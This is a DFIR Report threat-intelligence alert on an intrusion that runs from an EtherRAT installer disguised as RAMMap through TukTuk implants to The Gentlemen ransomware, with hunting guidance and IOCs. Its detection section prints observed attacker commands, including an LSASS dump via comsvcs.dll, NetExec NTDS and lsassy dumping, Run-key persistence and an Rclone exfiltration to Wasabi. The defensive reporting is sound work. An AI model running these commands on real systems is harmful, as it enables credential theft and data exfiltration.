---
title: "Flash Alert: EtherRat and TukTuk C2 End in The Gentleman Ransomware - The DFIR Report"
source_url: "https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/"
published: "2026-05-11T14:05:04+00:00"
author: "editor"
archived_at: "2026-08-25"
source_html: "2026-05-11_flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware.html"
---

# Flash Alert: EtherRat and TukTuk C2 End in The Gentleman Ransomware - The DFIR Report
## Background

The EtherRAT malware family was first reported by Sysdig back in December 2025. At that time, the initial access vector was exploitation of CVE-2025-55182 (React2Shell) targeting Linux servers. In March 2026, a Windows variant campaign was reported by Atos , with their investigation showing evidence of activity going back to the previous December.

In April, we observed an intrusion linked to the Atos-reported campaign where an EtherRAT was installed via a malicious MSI masquerading as a Sysinternals tool. Later in the intrusion, we observed the deployment of a new malware framework named TukTuk, first reported by Evangelos G, which, according to their analysis, is AI-generated. In addition to this, the threat actor used the RMM GoTo Resolve. Using this access, they successfully exfiltrated data to a cloud service and then deployed The Gentlemen ransomware.

Notably, in this intrusion, the threat actor employed an array of SaaS platforms and blockchain infrastructure, which makes their campaign resilient to traditional network defenses.

## Overview

In April, we observed a user execute a malicious MSI installer masquerading as the Sysinternals RAMMap utility. The installer deployed an EtherRAT variant that used the Ethereum blockchain through EtherHiding to dynamically update its command-and-control (C2) configuration.

After execution, the malware downloaded a portable Node.js runtime, launched obfuscated JavaScript payloads, and established persistence through a registry Run key. The malware then contacted 1rpc[.]io to retrieve configuration data hosted on the Ethereum blockchain. At the time of initial execution, no active C2 infrastructure was available.

The threat actor later updated the Ethereum-hosted configuration, directing the malware to a new TryCloudflare tunnel and enabling active C2 communications. In addition to rotating in new C2 domains, the actor pushed decoy domains alongside the legitimate infrastructure. This created the appearance that C2 traffic was also flowing to those decoys, likely to complicate analysis and infrastructure attribution.

Shortly after the config update, the malware initiated extensive host and domain reconnaissance, including system profiling, antivirus enumeration, domain checks, and LDAP-based user activity discovery.

The actor then downloaded additional payloads from S3 buckets, ultimately deploying TukTuk malware variants disguised as Greenshot binaries and executed via DLL sideloading. While Expel has previously reported on Greenshot being abused this way, we also observed the same sideloading technique applied to SyncTrayzor, the DocFX document generator, and the Cake build automation system.

These trojanized payloads established primary C2 channels through SaaS platforms ClickHouse and Supabase, with secondary backup channels capable of leveraging Ably, Dropbox, direct HTTP, or GitHub Issues.

TukTuk can use Arweave as a dead-drop resolver. In this mode, the implant queries the Arweave blockchain for a specific Drive-Id, then retrieves an encrypted configuration blob. That blob contains the credential pool for all supported C2 transports, including ClickHouse, Supabase, Slack, GitHub, Dropbox, and others. The functionality is fully implemented and connected in the loaded code. However, we could not confirm that this capability was used during this intrusion.

After execution of TukTuk, the threat actor began hands-on-keyboard activity, Kerberoasting operations, and credential discovery targeting administrative accounts. Next, the threat actor leveraged compromised service account credentials to deploy GoTo Resolve remote management tooling laterally across multiple systems, including servers and domain controllers. The above activity could not always be observed from the command line, but was captured in memory.

Over the following days, they expanded access through RDP, SMB, WinRM, NetExec (nxc), Mimikatz, and LSASS/NTDS dumping activity while resetting privileged account passwords and conducting broad Active Directory reconnaissance. Concurrently, the actor staged and executed Rclone to exfiltrate large volumes of sensitive data to Wasabi cloud storage before deploying additional TukTuk implants across critical infrastructure.

Three days into the intrusion, ransomware operations began with the deployment of The Gentlemen ransomware on key servers. Prior to encryption, the actor disabled Microsoft Defender protections, added AV exclusions, stopped virtual machines, deleted shadow copies, cleared event logs, and removed forensic artifacts.

The intrusion ended in domain-wide ransomware deployment through a malicious Group Policy Object (GPO) that executed staged ransomware binaries within SYSVOL/NETLOGON via scheduled tasks across the environment. The ransomware subsequently propagated broadly throughout the domain, dropping ransom notes and modifying desktop backgrounds on impacted systems.

## Detection Engineering and Threat Hunting (DEATH)

Initial Access and Execution

Monitor msiexec.exe executing from user Desktop/Downloads (C:\Users\*\Desktop\*.msi, C:\ProgramData\*.msi) and spawning unexpected children like the following.
C:\Windows\system32\msiexec.exe /V ⮡cmd.exe /c start /min "" "MVnVmUYj.cmd"
Hunt for curl use downloading files from the internet
curl -sLo "C:\Users\REDACTED\AppData\Local\Temp\9gY0LJMyXW.zip" "https://nodejs.org/dist/v18.20.5/node-v18.20.5-win-x64.zip"
Persistence

Monitor or hunt for unusual registry run keys added by command line.
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AppResolver /d "conhost --headless \"C:\Users\REDACTED\AppData\Local\P2RsupmqXnmx\gksVMg\node.exe\" \"C:\Users\REDACTED\AppData\Local\P2RsupmqXnmx\A7Pnj975bl.cfg\"" /f

Monitor or hunt for RMM service installations, and match with approval or common tool use for the environment.
A service was installed in the system. Service Name: GoToResolve_REDACTED Service File Name: "C:\Program Files (x86)\GoTo Resolve Unattended\REDACTED\GoToResolveProcessChecker.exe" -Service -WorkFolder "C:\Program Files (x86)\GoTo Resolve Unattended\REDACTED" -ApplicationType "4" Service Type: user mode service
Credential Access

Hunt for LSASS memory dumping via comsvcs.dll with tasklist enumeration.
CmD.eXe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\im4.txt full
Discovery

Threat actors continue to rely on Windows native utilities for discovery, hunt or detect on anomalous execution using these utilities.

Example automated discovery observed in intrusion:
C:\Windows\system32\cmd.exe /d /s /c "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "[System.Globalization.CultureInfo]::InstalledUICulture.Name"" C:\Windows\system32\cmd.exe /d /s /c "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "(Get-WmiObject Win32_VideoController).Name -join ', '"" C:\Windows\system32\cmd.exe /d /s /c "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA Stop).displayName -join ', ' } catch { 'none' }"" C:\Windows\system32\cmd.exe /d /s /c "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "(Get-WmiObject Win32_ComputerSystem).Domain"" C:\Windows\system32\cmd.exe /d /s /c "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "(Get-WmiObject Win32_ComputerSystem).PartOfDomain"" C:\Windows\system32\cmd.exe /d /s /c "reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName" C:\Windows\system32\cmd.exe /d /s /c "reg query "HKLM\SOFTWARE\Microsoft\Cryptography" /v MachineGuid"
Example manual discovery commands:
"cmd.exe" /c whoami /all "cmd.exe" /c net group "Domain Admins" /domain "cmd.exe" /c nltest /domain_trusts /all_trusts "cmd.exe" /c nltest /dclist:REDACTED "cmd.exe" /c net group "Enterprise Admins" /domain
Softperfect Network Scanner continues to be a favored tool in this and many other intrusions we observe.
Process Create: RuleName: technique_id=T1204,technique_name=User Execution UtcTime: 2026-REDACTED ProcessGuid: {4cb872ba-4760-69f4-6434-000000000600} ProcessId: 39696 Image: C:\temp\netscan.exe FileVersion: 7.2.9.0 Description: Multipurpose IPv4/IPv6 network scanner Product: SoftPerfect Network Scanner Company: SoftPerfect OriginalFileName: - CommandLine: "C:\temp\netscan.exe" CurrentDirectory: C:\temp\
Lateral Movement

In late 2025 and continuing in 2026 we are seeing threat actors more commonly deploy and use NetExec for lateral discovery and lateral execution in intrusions.
nxc smb REDACTED_IP -u REDACTED_USER -p REDACTED_PASSWORD --ntds nxc smb REDACTED_IP -u 1.txt -p 2.txt --no-bruteforce --continue-on-success nxc smb REDACTED_IP -u REDACTED_USER -p REDACTED_PASSWORD -M lsassy
Command and Control

Hunt for unusual outbound traffic to services that can be abused for C2, tunneling, dead-drop resolution, or malware configuration retrieval. In this intrusion, the threat actors relied on a mix of decentralized infrastructure, public tunneling services, SaaS platforms, and RMM tooling to maintain access and retrieve C2 configuration.

EtherRAT used decentralized infrastructure for C2 resolution, querying Ethereum smart contracts through 1rpc.io to resolve its current C2 URL. TukTuk could use Arweave as a dead-drop resolver, querying public Arweave gateways including goldsky.arweave.net , arweave.net , and g8way.io for a transaction tagged with a hardcoded Drive-Id .

Defenders should review outbound connections to these services from endpoints or servers that do not normally interact with blockchain, Web3, or decentralized storage infrastructure. Investigate process lineage, parent-child relationships, command-line activity, user context, destination history, and surrounding network behavior. If these services are not expected in the environment, alert on the activity and consider blocking them at egress.

The actors also used trycloudflare.com tunnel addresses, allowing remote access to the environment over a Cloudflare tunnel. Hunt for outbound connections to TryCloudflare from unusual hosts, especially when initiated by unexpected binaries or processes without a legitimate administrative use case.

TukTuk also made use of SaaS services, making it important for defenders to understand which SaaS platforms are approved in their environment. Unexpected access to services such as Supabase, ClickHouse, Ably, etc. may indicate malware using SaaS infrastructure for C2, tasking, or data storage.

RMM tools remain a common way for threat actors to blend into legitimate administrative traffic. In this case, GoTo Resolve was used as a C2 channel. Organizations should maintain an approved RMM inventory and alert on unauthorized RMM domains, installers, or remote access activity.

The following ET OPEN rules can assist with hunting and detection:
2058788: ET INFO Observed Smart Chain Domain in TLS SNI (1rpc .io) 2058739: ET INFO Observed Smart Chain Domain in DNS Lookup (1rpc .io) 2034552: ET INFO Observed DNS Query to Commonly Abused Cloudflare Domain (trycloudflare .com) 2058175: ET HUNTING TryCloudFlare Domain in TLS SNI 2060250: ET INFO Observed trycloudflare .com Domain in TLS SNI 2050130: ET INFO Observed Online Application Hosting Domain (supabase .co in TLS SNI) 2061992: ET INFO Observed RMM Domain (gotoresolve .com in TLS SNI) 2061989: ET INFO Observed DNS Query to RMM Domain (gotoresolve .com)
Additionally, hunt for abnormal network connections from renamed or abused legitimate binaries observed in this intrusion, including:
Greenshot.exe SyncTrayzor.exe docfx.exe Cake.exe
Focus on these binaries making unexpected outbound connections, communicating with newly observed destinations, launching from unusual directories, or appearing on hosts where they are not part of normal software usage.

Exfiltration

Rclone continues to be one of the most popular tools used by threat actors to exfiltrate large amounts of data to cloud storage services; monitor for its use in your environment.
C:\Users\REDACTED\Downloads\rclone-v1.73.5-windows-amd64\rclone-v1.73.5-windows-amd64\rclone.exe copy "Z:\REDACTED\REDACTEDs" wasabi:"/REDACTED/REDACTED" --max-age 2y --exclude "AppData/**" --copy-links --transfers=16 --checkers=128 --fast-list --progress --ignore-existing --cache-workers=32 --multi-thread-streams=32 --multi-thread-chunk-size=512M --multi-thread-cutoff=128M --max-backlog=20000 --stats=5s --use-mmap --tpslimit=0 --bwlimit=off

In this case, the Wasabi storage service was used. Similar to the C2 section, make sure you know what cloud storage services are in use in your environment and monitor or detect on others being used. The ET ruleset can help.
2046657: ET FILE_SHARING Commonly Abused File Sharing Domain (wasabisys .com) in TLS SNI

## Notifications & Acknowledgments

We’d like to thank Anna and Renzon Cruz for their contributions to this report.

We’d like to thank our partners at Supabase, ClickHouse, and GoTo for quickly taking down infrastructure related to the threat actor and directly imposing costs against their operation.

## Contact

For any questions, please reach out – https://thedfirreport.com/company/contact-us/

## Indicators of Compromise (IOCs)

This list includes domains that may be shared SaaS infrastructure so you may not want to apply them directly to block lists.

Domains:
1rpc:
1rpc.io

Cloudflare:
https://witch-skins-lip-coal.trycloudflare.com
https://fields-pct-easier-vancouver.trycloudflare.com
https://howto-tar-naturals-coordination.trycloudflare.com
https://workshop-lighting-protective-customs.trycloudflare.com
https://afford-effect-construct-tricks.trycloudflare.com
https://rapids-lil-lending-charleston.trycloudflare.com
https://when-architectural-cdna-faster.trycloudflare.com
https://mode-exit-legendary-trusted.trycloudflare.com
https://seasonal-estimation-heating-necessarily.trycloudflare.com
https://entered-medications-motherboard-advanced.trycloudflare.com
https://walt-messaging-affairs-occurring.trycloudflare.com

Supabase:
vefbdzzuaadnascpeqcn.supabase.co

Clickhouse:
k135neflez.westus3.azure.clickhouse.cloud

Fallback http C2:
borjumaniya.store

Domains seen in a related Campaign:

ClickHouse:
vngz3ntdrb.us-east1.gcp.clickhouse.cloud

Supabase:
muurfzqprzmdkzoibxaz.supabase.co

Neon:
ep-lively-cherry-a80bmwii.eastus2.azure.neon.tech
Ethereum Contracts:
0xdf0b529043ef7a2bb9111bad26de624a326bacf9
0x5953f27F044779a3AFCd2BF56a4B712583Dd2E4e

Arweave Drive-Id
a6278417-39f4-407e-90bf-599f74726e66

Hashes:
RAMMap.msi (Initial Acccess)
73ce2438d4ed475e03727b7b000d2794
3d5ee8429ef00824c0351cba507dfeb92b54f83b
d9487fdc097f770e5661f9e5dee130068cb179d33716abff1a21c8cb901f25a6

MVnVmUYj.cmd (EtherRAT)
b2d51212744f404714fd909e87254d98
c98ee41f09ae079a5643626f57eb84f92205bb2b
8c2665adf8bfab65463f2a9bd1b7bb0231de3f5c1e6a2e51479e44aaac2e7bf0

A7Pnj975bl.cfg (EtherRAT)
c92cf9a1af5b1fe25cdcb8771ce52be4
b44c8084b88d31113ee51758740eb84c251bdae8
4142d5efd4ea2abab77f2f0a917610e2ff976bf9e19d7ad1e9156eccdc5412db

v72HYLU3OpRBznc.ini (EtherRAT)
77fbe265fd65c7f7b6d323fb6de6a4fd
114ec028a3fc4ed50056ee8166b0c39acff6ff03
2d4b4bb18b8445e49eeda571982874403befcecf78266e3d405f6529d98bee46

log4net.dll (TukTuk)
f985b8d6d635c266fc4779dad77aa75c
ba80d7b038758a129861e1e498e462cc3d68ae20
19021e53b9929fdf4b7d0e0707434d56bb73c1a9b7403c8837b44d1c417198dc

smokymo.msi (GoTo Resolve)
b188fbc6ff5557767e73e4c883a553a3
aa9218994798ae31a19d3e7e39cfac2e2ee55840
1795eacd2c58894ccdd6be8854fe6456c3b069a3a873432343b57b475b256aee
#TB40048

##### Share this entry

- Share on Facebook

- Share on X

- Share on WhatsApp

- Share on Linkedin

- Share on Reddit

- Share by Mail
